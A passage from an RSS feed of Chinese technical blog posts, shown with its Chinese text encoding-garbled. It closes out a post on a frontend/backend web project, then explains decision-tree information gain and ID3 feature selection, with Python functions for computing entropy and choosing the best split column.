<p>å…¶å®è¿™ä¹Ÿæ˜¯å‰åç«¯åˆ†ç¦»çš„ä¼˜åŠ¿ï¼Œåç«¯æä¾›æ•°æ®èµ„æºçš„è·å–ï¼Œå‰ç«¯åˆ™è´Ÿè´£æ•°æ®çš„å¯è§†åŒ–ã€‚æœ€ç»ˆçš„æ•ˆæœå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c7cde63e2f904fddaf447883f0d6b177~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY2hhcmxlZTQ0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767938180&amp;x-signature=7Tr9g%2BpFk9K3t5H7gzjR6sPQu4Q%3D" alt="ä»åç«¯è®¿é—®æ•°æ®åˆ°å‰ç«¯è¿›è¡Œå±•ç¤º" loading="lazy"/></p>
<h2 data-id="heading-4">3. å…¶ä»–</h2>
<p>ä»¥ä¸Šå°±æ˜¯ä¸€ä¸ªæœ€ç®€å•çš„å‰åç«¯åˆ†ç¦» Web é¡¹ç›®ã€‚ä»»ä½•å¤æ‚åŠŸèƒ½éƒ½å¯ä»¥åœ¨æ­¤åŸºç¡€ä¸Šè¿›è¡Œæ‰©å±•ï¼Œåªéœ€æ­é…ç›¸åº”çš„æ¶æ„è®¾è®¡ï¼Œä»¥æ›´å¥½åœ°æ”¯æŒå…·ä½“ä¸šåŠ¡éœ€æ±‚ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdownload.csdn.net%2Fdownload%2Fcharlee44%2F92492805" target="_blank" title="https://download.csdn.net/download/charlee44/92492805" ref="nofollow noopener noreferrer">å®ç°ä»£ç </a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¤§æ•°æ®-200 å†³ç­–æ ‘ä¿¡æ¯å¢ç›Šè¯¦è§£ï¼šä¿¡æ¯ç†µã€ID3 é€‰ç‰¹å¾ä¸ Python æœ€ä½³åˆ‡åˆ†å®ç°]]></title>    <link>https://juejin.cn/post/7590020026394296374</link>    <guid>https://juejin.cn/post/7590020026394296374</guid>    <pubDate>2026-01-02T06:12:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590020026394296374" data-draft-id="7589932422653853732" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¤§æ•°æ®-200 å†³ç­–æ ‘ä¿¡æ¯å¢ç›Šè¯¦è§£ï¼šä¿¡æ¯ç†µã€ID3 é€‰ç‰¹å¾ä¸ Python æœ€ä½³åˆ‡åˆ†å®ç°"/> <meta itemprop="keywords" content="åç«¯,å¤§æ•°æ®,æœºå™¨å­¦ä¹ "/> <meta itemprop="datePublished" content="2026-01-02T06:12:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ­¦å­åº·"/> <meta itemprop="url" content="https://juejin.cn/user/149189314230039"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¤§æ•°æ®-200 å†³ç­–æ ‘ä¿¡æ¯å¢ç›Šè¯¦è§£ï¼šä¿¡æ¯ç†µã€ID3 é€‰ç‰¹å¾ä¸ Python æœ€ä½³åˆ‡åˆ†å®ç°
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/149189314230039/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ­¦å­åº·
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T06:12:38.000Z" title="Fri Jan 02 2026 06:12:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»12åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">TL;DR</h2>
<ul>
<li>åœºæ™¯ï¼šç”¨ä¿¡æ¯ç†µ/ä¿¡æ¯å¢ç›Šè§£é‡Šå†³ç­–æ ‘ä¸ºä½•é€‰æ‹©æŸåˆ—åˆ‡åˆ†ï¼Œå¹¶ç”¨ Python å¤ç°â€œæœ€ä½³åˆ‡åˆ†åˆ—â€ã€‚</li>
<li>ç»“è®ºï¼šæœ€å¤§åŒ–ä¿¡æ¯å¢ç›Š â‡” æœ€å°åŒ–å­èŠ‚ç‚¹ç†µçš„åŠ æƒå¹³å‡ï¼›ID3 ç”¨è´ªå¿ƒé€’å½’æ„å»ºæ ‘ä½†æ˜“åå¥½å¤šå–å€¼ç‰¹å¾ã€‚</li>
<li>äº§å‡ºï¼šä¿¡æ¯å¢ç›Šæ¨å¯¼è„‰ç»œ + æœ€ä½³åˆ‡åˆ†/æŒ‰åˆ—åˆ‡åˆ†/é€’å½’å»ºæ ‘ä»£ç éª¨æ¶ + å¸¸è§å‘ä½é€ŸæŸ¥ã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9d900ea02a964b3e931b559f7ec48c66~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767939157&amp;x-signature=L69xSqit5ljoIa3f2TfxqfEUMO4%3D" alt="å¤§æ•°æ®-200 å†³ç­–æ ‘ä¿¡æ¯å¢ç›Šè¯¦è§£ï¼šä¿¡æ¯ç†µã€ID3 é€‰ç‰¹å¾ä¸ Python æœ€ä½³åˆ‡åˆ†å®ç°" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e090a54e1fde461fb4a270b3a03fb244~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767939157&amp;x-signature=6O%2BltzUAB%2FJZ%2F%2F20uP%2B7gNRfMd4%3D" alt="å¤§æ•°æ®-200 å†³ç­–æ ‘ä¿¡æ¯å¢ç›Šè¯¦è§£ï¼šä¿¡æ¯ç†µã€ID3 é€‰ç‰¹å¾ä¸ Python æœ€ä½³åˆ‡åˆ†å®ç°" loading="lazy"/></p>
<h2 data-id="heading-1">ä¿¡æ¯å¢ç›Š</h2>
<p>å†³ç­–æ ‘æœ€ç»ˆçš„ä¼˜åŒ–ç›®æ ‡ä½¿å¾—å¶èŠ‚ç‚¹çš„æ€»ä¸çº¯åº¦æœ€ä½ï¼Œå³å¯¹åº”è¡¡é‡ä¸çº¯åº¦çš„æŒ‡æ ‡æœ€ä½ã€‚
åŒæ—¶æˆ‘ä»¬çŸ¥é“ï¼Œå…¨å±€æœ€ä¼˜æ ‘æ²¡æœ‰åŠæ³•ç®€å•é«˜æ•ˆçš„è·å¾—ï¼Œå› æ­¤æ­¤å¤„æˆ‘ä»¬ä»ç„¶è¦ä»¥å±€éƒ¨æœ€ä¼˜æ–¹æ³•æ¥æŒ‡å¯¼å»ºæ¨¡è¿‡ç¨‹ï¼Œå¹¶é€šè¿‡ä¼˜åŒ–æ¡ä»¶çš„è®¾ç½®ï¼Œæœ€ç»ˆåœ¨æ¯ä¸€æ­¥éƒ½æ˜¯å±€éƒ¨æœ€ä¼˜çš„æ¡ä»¶ä¸‹é€æ­¥æ¥è¿‘æœ€å¯èƒ½çš„å…¨å±€æœ€ä¼˜è§£çš„ç»“æœã€‚
è€Œåœ¨ä¿¡æ¯ç†µæŒ‡æ•°çš„æŒ‡å¯¼ä¸‹ï¼Œå†³ç­–æ ‘ç”Ÿæˆè¿‡ç¨‹çš„å±€éƒ¨æœ€ä¼˜æ¡ä»¶ä¹Ÿéå¸¸å¥½ç†è§£ï¼šå³åœ¨é€‰å–å±æ€§æµ‹è¯•æ¡ä»¶ï¼ˆattribute test conditionï¼‰å¯¹æŸèŠ‚ç‚¹ï¼ˆæ•°æ®é›†ï¼‰è¿›è¡Œåˆ‡åˆ†çš„æ—¶å€™ï¼Œå°½å¯èƒ½é€‰å–ä½¿å¾—è¯¥èŠ‚ç‚¹å¯¹åº”çš„å­èŠ‚ç‚¹ä¿¡æ¯ç†µæœ€å°çš„ç‰¹å¾è¿›è¡Œåˆ‡åˆ†ã€‚
æ¢è¨€ä¹‹ï¼Œå°±æ˜¯è¦æ±‚çˆ¶èŠ‚ç‚¹ä¿¡æ¯ç†µå’Œå­èŠ‚ç‚¹ä¿¡æ¯ç†µä¹‹å·®è¦æœ€å¤§ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cdc56c2a9fbf4e41a19c5980c3044b71~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767939157&amp;x-signature=Wk953ZfdHY9PpK1YeynhKFTl2WY%3D" alt="ä¿¡æ¯å¢ç›Š" loading="lazy"/></p>
<p>ä¹Ÿå¯ä»¥ç”¨ä»¥ä¸‹å…¬å¼ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1d2e80678d114deeb09c6d64b050485b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767939157&amp;x-signature=FlPtUFCaxGM23NPrgSlzCFzJZfI%3D" alt="ä¿¡æ¯å¢ç›Š" loading="lazy"/>
å†³ç­–æ ‘å½’çº³ç®—æ³•é€šå¸¸é€‰æ‹©æœ€å¤§åŒ–å¢ç›Šçš„æµ‹è¯•æ¡ä»¶ï¼Œå› ä¸ºå¯¹æ‰€æœ‰çš„æµ‹è¯•æ¡ä»¶æ¥è¯´ï¼ŒEntï¼ˆDï¼‰æ˜¯ä¸€ä¸ªä¸å˜çš„å€¼ï¼Œæ‰€ä»¥æœ€å¤§åŒ–å¢ç›Šç­‰ä»·äºæœ€å°åŒ–åˆ†æ”¯èŠ‚ç‚¹çš„ä¸çº¯æ€§åº¦é‡çš„åŠ æƒå¹³å‡å€¼ã€‚æœ€åï¼Œå½“é€‰æ‹©ç†µä½œä¸ºå…¬å¼çš„ä¸çº¯æ€§åº¦é‡æ—¶ï¼Œç†µçš„å·®å°±æ˜¯æ‰€è°“çš„â€œä¿¡æ¯å¢ç›Šâ€ï¼Œå³èµ„è®¯è·åˆ©ï¼ˆinformation gainï¼‰ã€‚</p>
<h2 data-id="heading-2">åˆ’åˆ†æ•°æ®é›†</h2>
<p>åˆ†ç±»ç®—æ³•é™¤äº†éœ€è¦æµ‹é‡ä¿¡æ¯ç†µï¼Œè¿˜éœ€è¦å¯¹æ•°æ®é›†è¿›è¡Œæœ‰æ•ˆçš„åˆ’åˆ†ã€‚ä¿¡æ¯ç†µæ˜¯è¡¡é‡æ•°æ®é›†çº¯åº¦çš„é‡è¦æŒ‡æ ‡ï¼Œè€Œæ•°æ®é›†åˆ’åˆ†åˆ™æ˜¯æ„å»ºå†³ç­–æ ‘çš„å…³é”®æ­¥éª¤ã€‚</p>
<p>åœ¨äº†è§£å¦‚ä½•è®¡ç®—ä¿¡æ¯ç†µä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥é‡‡ç”¨ä¿¡æ¯å¢ç›Šçš„æ–¹æ³•æ¥è¯„ä¼°æ•°æ®é›†åˆ’åˆ†çš„è´¨é‡ã€‚å…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š</p>
<ol>
<li>è®¡ç®—å½“å‰æ•°æ®é›†çš„æ€»ä¿¡æ¯ç†µ</li>
<li>å¯¹æ¯ä¸ªå€™é€‰ç‰¹å¾è¿›è¡Œä»¥ä¸‹æ“ä½œï¼š
<ul>
<li>æŒ‰ç…§è¯¥ç‰¹å¾çš„å¯èƒ½å–å€¼å°†æ•°æ®é›†åˆ’åˆ†ä¸ºè‹¥å¹²å­é›†</li>
<li>è®¡ç®—æ¯ä¸ªå­é›†çš„ä¿¡æ¯ç†µ</li>
<li>è®¡ç®—åˆ’åˆ†åçš„åŠ æƒå¹³å‡ä¿¡æ¯ç†µ</li>
<li>è®¡ç®—è¯¥ç‰¹å¾çš„ä¿¡æ¯å¢ç›Šï¼ˆæ€»ä¿¡æ¯ç†µ - åŠ æƒå¹³å‡ä¿¡æ¯ç†µï¼‰</li>
</ul>
</li>
</ol>
<p>ä¾‹å¦‚ï¼Œåœ¨åˆ¤æ–­æ˜¯å¦æ‰¹å‡†è´·æ¬¾çš„æ•°æ®é›†ä¸­ï¼Œå¯èƒ½åŒ…å«"æ”¶å…¥"ã€"ä¿¡ç”¨è®°å½•"ç­‰ç‰¹å¾ã€‚æˆ‘ä»¬éœ€è¦ï¼š</p>
<ul>
<li>è®¡ç®—åŸå§‹æ•°æ®é›†çš„ä¿¡æ¯ç†µ</li>
<li>å¯¹"æ”¶å…¥"ç‰¹å¾ï¼šæŒ‰é«˜ã€ä¸­ã€ä½åˆ’åˆ†æ•°æ®é›†ï¼Œåˆ†åˆ«è®¡ç®—å„å­é›†çš„ä¿¡æ¯ç†µ</li>
<li>å¯¹"ä¿¡ç”¨è®°å½•"ç‰¹å¾ï¼šæŒ‰è‰¯å¥½ã€ä¸€èˆ¬ã€å·®åˆ’åˆ†æ•°æ®é›†ï¼Œåˆ†åˆ«è®¡ç®—å„å­é›†çš„ä¿¡æ¯ç†µ</li>
<li>æ¯”è¾ƒå„ç‰¹å¾çš„ä¿¡æ¯å¢ç›Šï¼Œé€‰æ‹©å¢ç›Šæœ€å¤§çš„ç‰¹å¾ä½œä¸ºæœ€ä¼˜åˆ’åˆ†æ ‡å‡†</li>
</ul>
<p>é€šè¿‡è¿™ç§åŸºäºä¿¡æ¯å¢ç›Šçš„ç‰¹å¾é€‰æ‹©æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥ç¡®å®šæœ€ä½³çš„åˆ’åˆ†æ–¹å¼ï¼Œä»è€Œæ„å»ºå‡ºé«˜æ•ˆçš„å†³ç­–æ ‘æ¨¡å‹ã€‚åœ¨å®é™…åº”ç”¨ä¸­ï¼Œè¿™ç§æ–¹æ³•è¢«å¹¿æ³›ç”¨äºå®¢æˆ·åˆ†ç±»ã€åŒ»ç–—è¯Šæ–­ã€é£é™©è¯„ä¼°ç­‰å¤šä¸ªé¢†åŸŸã€‚</p>
<h2 data-id="heading-3">æ•°æ®é›†æœ€ä½³åˆ‡åˆ†å‡½æ•°</h2>
<p>åˆ’åˆ†æ•°æ®é›†çš„æœ€å¤§å‡†åˆ™æ˜¯é€‰æ‹©æœ€å¤§ä¿¡æ¯å¢ç›Šï¼Œä¹Ÿå°±æ˜¯ä¿¡æ¯ä¸‹é™æœ€å¿«çš„æ–¹å‘ã€‚
é€šè¿‡æ‰‹åŠ¨è®¡ç®—ï¼Œæˆ‘ä»¬çŸ¥é“ï¼š</p>
<ul>
<li>ç¬¬ 0 åˆ—çš„ä¿¡æ¯å¢ç›Šä¸º 0.42ï¼Œç¬¬ 1 åˆ—çš„ä¿¡æ¯å¢ç›Šä¸º 0.17</li>
<li>æ‰€ä»¥æˆ‘ä»¬åº”è¯¥é€‰æ‹©ç¬¬ 0 åˆ—è¿›è¡Œåˆ‡åˆ†æ•°æ®é›†</li>
</ul>
<p>ç”¨ Python å¯ä»¥é€šè¿‡ä»¥ä¸‹ä»£ç æ¥è¾“å‡ºæ¯ä¸€åˆ—çš„ä¿¡æ¯å¢ç›Šï¼ˆäº†è§£å³å¯ï¼‰ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># å®šä¹‰ä¿¡æ¯ç†µ</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">calEnt</span>(<span class="hljs-params">dataSet</span>):
    n = dataSet.shape[<span class="hljs-number">0</span>]  <span class="hljs-comment"># æ•°æ®é›†æ€»è¡Œæ•°</span>
    iset = dataSet.iloc[:, -<span class="hljs-number">1</span>].value_counts()  <span class="hljs-comment"># ç»Ÿè®¡æ ‡ç­¾çš„æ‰€æœ‰ç±»åˆ«</span>
    p = iset / n  <span class="hljs-comment"># ç»Ÿè®¡æ¯ä¸€ç±»æ ‡ç­¾æ‰€å æ¯”ä¾‹</span>
    ent = (-p * np.log2(p)).<span class="hljs-built_in">sum</span>()  <span class="hljs-comment"># è®¡ç®—ä¿¡æ¯ç†µ</span>
    <span class="hljs-keyword">return</span> ent

<span class="hljs-comment"># é€‰æ‹©æœ€ä¼˜çš„åˆ—è¿›è¡Œåˆ‡åˆ†</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">bestSplit</span>(<span class="hljs-params">dataSet</span>):
    baseEnt = calEnt(dataSet)  <span class="hljs-comment"># è®¡ç®—åŸå§‹ç†µ</span>
    bestGain = <span class="hljs-number">0</span>  <span class="hljs-comment"># åˆå§‹åŒ–ä¿¡æ¯å¢ç›Š</span>
    axis = -<span class="hljs-number">1</span>  <span class="hljs-comment"># åˆå§‹åŒ–æœ€ä½³åˆ‡åˆ†åˆ—</span>

    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(dataSet.shape[<span class="hljs-number">1</span>] - <span class="hljs-number">1</span>):  <span class="hljs-comment"># å¯¹ç‰¹å¾çš„æ¯ä¸€åˆ—è¿›è¡Œå¾ªç¯</span>
        levels = dataSet.iloc[:, i].value_counts().index  <span class="hljs-comment"># æå–å‡ºå½“å‰åˆ—çš„æ‰€æœ‰å–å€¼</span>
        ents = <span class="hljs-number">0</span>  <span class="hljs-comment"># åˆå§‹åŒ–å­èŠ‚ç‚¹çš„ä¿¡æ¯ç†µ</span>

        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> levels:  <span class="hljs-comment"># å¯¹å½“å‰åˆ—çš„æ¯ä¸€ä¸ªå–å€¼è¿›è¡Œå¾ªç¯</span>
            childSet = dataSet[dataSet.iloc[:, i] == j]  <span class="hljs-comment"># æŸä¸€ä¸ªå­èŠ‚ç‚¹çš„ dataframe</span>
            ent = calEnt(childSet)  <span class="hljs-comment"># è®¡ç®—æŸä¸€ä¸ªå­èŠ‚ç‚¹çš„ä¿¡æ¯ç†µ</span>
            ents += (childSet.shape[<span class="hljs-number">0</span>] / dataSet.shape[<span class="hljs-number">0</span>]) * ent  <span class="hljs-comment"># è®¡ç®—å½“å‰åˆ—çš„ä¿¡æ¯ç†µ</span>

        <span class="hljs-built_in">print</span>(<span class="hljs-string">'ç¬¬{}åˆ—çš„ä¿¡æ¯ç†µä¸º{}'</span>.<span class="hljs-built_in">format</span>(i, ents))
        infoGain = baseEnt - ents  <span class="hljs-comment"># è®¡ç®—å½“å‰åˆ—çš„ä¿¡æ¯å¢ç›Š</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">'ç¬¬{}åˆ—çš„ä¿¡æ¯å¢ç›Šä¸º{}\n'</span>.<span class="hljs-built_in">format</span>(i, infoGain))

        <span class="hljs-keyword">if</span> infoGain &gt; bestGain:
            bestGain = infoGain  <span class="hljs-comment"># é€‰æ‹©æœ€å¤§ä¿¡æ¯å¢ç›Š</span>
            axis = i  <span class="hljs-comment"># æœ€å¤§ä¿¡æ¯å¢ç›Šæ‰€åœ¨åˆ—çš„ç´¢å¼•</span>

    <span class="hljs-built_in">print</span>(<span class="hljs-string">"ç¬¬{}åˆ—ä¸ºæœ€ä¼˜åˆ‡åˆ†åˆ—"</span>.<span class="hljs-built_in">format</span>(axis))
    <span class="hljs-keyword">return</span> axis

</code></pre>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬éªŒè¯æ„é€ çš„æ•°æ®é›†æœ€ä½³åˆ‡åˆ†å‡½æ•°è¿”å›çš„ç»“æœä¸æ‰‹åŠ¨è®¡ç®—çš„ç»“æœæ˜¯å¦ä¸€è‡´ï¼š</p>
<pre><code class="hljs language-python" lang="python">bestSplit(dataSet)
</code></pre>
<p>æ‰§è¡Œç»“æœå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/42fcff620e9547988fbae0f007f2cb84~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767939157&amp;x-signature=gPYqtS%2B6GIaXQWnY6iz7RUTKIfU%3D" alt="æ•°æ®é›†æœ€ä½³åˆ‡åˆ†å‡½æ•°" loading="lazy"/>
ä¹Ÿå°±æ˜¯è¯´ï¼Œæœ€å¤§ä¿¡æ¯ç†µçš„æ‰€é€‰çš„ç‰¹å¾æ˜¯åˆ†ç±»åç†µå€¼æœ€å°çš„ç‰¹å¾ã€‚
åˆ†ç±»åç†µå€¼æœ€å°çš„ç‰¹å¾æ°æ°æ˜¯åˆ†ç±»ç»“æœä¸€è‡´çš„ç‰¹å¾ï¼Œè€Œåˆ†ç±»ç»“æœä¸€è‡´çš„ç‰¹å¾å¿…é¡»æ˜¯ä¸¤ç±»æ ·æœ¬å·®å¼‚æœ€å¤§çš„ç‰¹å¾ã€‚</p>
<h2 data-id="heading-4">æŒ‰ç…§ç»™å®šåˆ—åˆ‡åˆ†æ•°æ®é›†</h2>
<p>é€šè¿‡æœ€ä½³åˆ‡åˆ†å‡½æ•°è¿”å›æœ€ä½³åˆ‡åˆ†åˆ—çš„ç´¢å¼•ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ ¹æ®è¿™ä¸ªç´¢å¼•ï¼Œæ„å»ºä¸€ä¸ªæŒ‰ç…§ç»™å®šåˆ—åˆ‡åˆ†æ•°æ®é›†çš„å‡½æ•°ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-string">"""
å‡½æ•°åŠŸèƒ½ï¼šæŒ‰ç…§ç»™å®šçš„åˆ—åˆ’åˆ†æ•°æ®é›†
å‚æ•°è¯´æ˜ï¼š
dataSetï¼šåŸå§‹æ•°æ®é›†
axisï¼šæŒ‡å®šçš„åˆ—ç´¢å¼•
valueï¼šæŒ‡å®šçš„å±æ€§å€¼
returnï¼šredataSetï¼šæŒ‰ç…§æŒ‡å®šåˆ—ç´¢å¼•å’Œå±æ€§å€¼åˆ‡åˆ†åçš„æ•°æ®é›†
"""</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">mySplit</span>(<span class="hljs-params">dataSet, axis, value</span>):
    col = dataSet.columns[axis]
    redataSet = dataSet.loc[dataSet[col] == value, :].drop(col, axis=<span class="hljs-number">1</span>)
    <span class="hljs-keyword">return</span> redataSet

<span class="hljs-comment"># éªŒè¯å‡½æ•°ï¼šä»¥ axis=0ï¼Œvalue=1 ä¸ºä¾‹</span>
mySplit(dataSet, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>)

</code></pre>
<p>æ‰§è¡Œç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7349580d70c34ca68a62a46aa2605225~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767939157&amp;x-signature=efvUjC30JWgprqsBWSt1BxEG%2Fgs%3D" alt="æŒ‰ç…§ç»™å®šåˆ—åˆ‡åˆ†æ•°æ®é›†" loading="lazy"/></p>
<h2 data-id="heading-5">å†³ç­–æ ‘çš„ç”Ÿæˆ</h2>
